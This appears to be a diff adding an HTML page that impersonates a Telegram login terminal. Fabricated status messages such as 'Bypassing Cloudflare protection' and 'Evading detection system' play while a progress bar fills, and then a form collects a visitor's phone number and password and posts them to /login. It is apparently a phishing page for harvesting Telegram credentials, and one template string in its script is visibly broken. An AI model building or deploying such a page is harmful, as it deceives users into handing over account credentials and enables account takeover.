@@ -1,1 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Telegram Terminal Login</title>
+    <meta charset="UTF-8">
+    <style>
+        body { background:#000; color:#0f0; font-family: 'Courier New', monospace; padding:20px; margin:0; overflow:hidden; }
+        pre { line-height:1.4; white-space: pre-wrap; }
+        .blink { animation: blink 1s steps(2, start) infinite; }
+        @keyframes blink { to { visibility: hidden; } }
+        .hidden { display: none; }
+        .spinner { display: inline-block; animation: spin 1s linear infinite; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+<pre id="output">
+Telegram CLI Emulator v9.8.8
+Copyright 2025 Telegram Foundation
 
+<span id="loading">
+Initializing terminal...<span class="spinner">↺</span>
+[OK] Loading modules...
+[OK] Connecting to dc5.telegram.org:443...<span class="spinner">↺</span>
+[OK] Handshake complete
+[OK] Bypassing Cloudflare protection...<span class="spinner">↺</span>
+[OK] Injecting session key...
+[OK] Authenticating with MTProto 2.0...<span class="spinner">↺</span>
+
+<span id="progress">Progress: [##########          ] 50%</span>
+
+[OK] Evading detection system...
+[OK] Ready for secure login
+
+Authentication required for security reasons.
+</span>
+
+<span id="form" class="hidden">
+$ phone: <form action="/login" method="post" style="display:inline;" id="loginForm">
+<input type="text" name="phone" placeholder="+79991234567" autofocus required id="phoneInput">
+<br>$ password: <input type="password" name="password" placeholder="(optional if 2FA enabled)">
+<br><input type="submit" value="login" style="display:none;">
+</form>
+<span class="blink">_</span>
+</span>
+</pre>
+
+<script>
+// Анимация прогресс-бара
+const progress = document.getElementById('progress');
+const loading = document.getElementById('loading');
+const form = document.getElementById('form');
+const phoneInput = document.getElementById('phoneInput');
+
+let percent = 50;
+const interval = setInterval(() => {
+    percent += Math.floor(Math.random() * 15) + 5;
+    if (percent >= 100) {
+        percent = 100;
+        progress.textContent = 'Progress: [####################] 100%';
+        loading.style.display = 'none';
+        form.classList.remove('hidden');
+        phoneInput.focus();
+        clearInterval(interval);
+    } else {
+        const bars = '#'.repeat(Math.floor(percent / 5)) + ' '.repeat(20 - Math.floor(percent / 5));
+        progress.textContent = `Progress: [\( {bars}] \){percent}%`;
+    }
+}, 800 + Math.random() * 700); // Рандомная задержка для реализма
+
+// Автофокус на ввод
+document.addEventListener('DOMContentLoaded', () => {
+    setTimeout(() => phoneInput.focus(), 100);
+});
+</script>
+</body>
+</html>
